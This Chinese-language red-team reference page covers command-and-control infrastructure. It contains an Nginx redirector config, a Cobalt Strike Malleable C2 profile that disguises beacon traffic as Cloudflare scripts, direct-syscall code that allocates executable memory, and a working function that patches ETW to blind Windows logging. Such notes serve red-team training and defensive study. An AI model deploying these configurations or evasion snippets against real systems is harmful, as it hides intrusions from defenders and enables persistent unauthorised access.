# C2基础设施

## 概述

C2（Command and Control，命令与控制）是红队乃至 APT 组织最核心的基础设施组件。C2 服务器用于与被攻陷的目标建立持久化信道，下发指令并回传数据。C2 基础设施的设计和部署直接决定了红队行动的安全性和隐蔽性。

## 红队基础设施架构

典型的红队 C2 基础设施层级：

```
攻击者 → 域名/CDN → 前置Redirector → C2服务器 → Payload分发节点 → 目标
                            ↓
                    日志/监控服务器
```

### Redirector / 中继服务器

使用 Nginx/Apache 反向代理转发 C2 流量，隐藏后端 C2 真实 IP：

```nginx
# Nginx Redirector 配置示例
server {
    listen 443 ssl;
    server_name cdn-update.example.com;

    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;

    location / {
        proxy_pass https://real-c2-server:443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_ssl_verify off;
    }
}
```

### C2 Profile 配置

Cobalt Strike Malleable C2 Profile 用于模拟合法流量形态：

```
# 模拟 Cloudflare JavaScript 资源
http-get {
    set uri "/cdn-cgi/scripts/zepto.min.js";
    client {
        header "Accept" "*/*";
        header "Referer" "https://www.cloudflare.com";
        metadata {
            base64url;
            prepend "var __cf_uid=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "text/javascript";
        output {
            base64url;
            print;
        }
    }
}
```

## EDR 规避技术

### Sleep Mask

Beacon 在休眠时对内存中的 beacon 区域进行加密，避免被内存扫描发现：

```
# Cobalt Strike sleep_mask 配置
sleep_mask "true";
```

### 间接系统调用

绕过 EDR 挂钩（userland hooks）直接调用内核：

- **Hell's Gate**: 直接从 ntdll.dll 解析 syscall SSN（系统服务号）
- **Halo's Gate**: 在 Hell's Gate 基础上跳过可疑的 syscall 指令
- **Tartarus Gate**: 综合多种解析策略
- **Syswhispers2**: 生成直接 syscall 的汇编代码模板

```c
// 直接系统调用示例 (Syswhispers2)
extern NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// 无需经过 ntdll.dll，直接 syscall
NTSTATUS status = NtAllocateVirtualMemory(
    NtCurrentProcess(), &addr, 0, &size,
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
);
```

### ETW/EventLog 修补

禁用 Windows 事件跟踪（ETW）和 Event Log 以规避日志记录：

```c
// 修补 ETW (EtwEventWrite)
void PatchEtw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PVOID etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
    
    DWORD oldProtect;
    VirtualProtect(etwAddr, 1, PAGE_READWRITE, &oldProtect);
    memset(etwAddr, 0xC3, 1); // RET 指令覆盖函数入口
    VirtualProtect(etwAddr, 1, oldProtect, &oldProtect);
}
```

### 栈欺骗 (Stack Spoofing)

在调用敏感 API 时伪造调用栈，避免基于栈回溯的检测：

- 将当前栈帧复制到可控内存
- 构造伪造的栈回溯信息
- 调用结束后恢复原始栈帧

## 现代 C2 的发展趋势

1. **SaaS 化 C2**: 使用 Google Cloud Functions/AWS Lambda 作为无服务器 C2
2. **E2EE 通信**: Beacons 使用双端加密防止中间人解包
3. **多协议 Fallback**: 主协议被阻断时自动切换到备选协议
4. **自定义反射加载器**: 实现完全自主的 PE/DLL 内存加载，替代标准反射加载
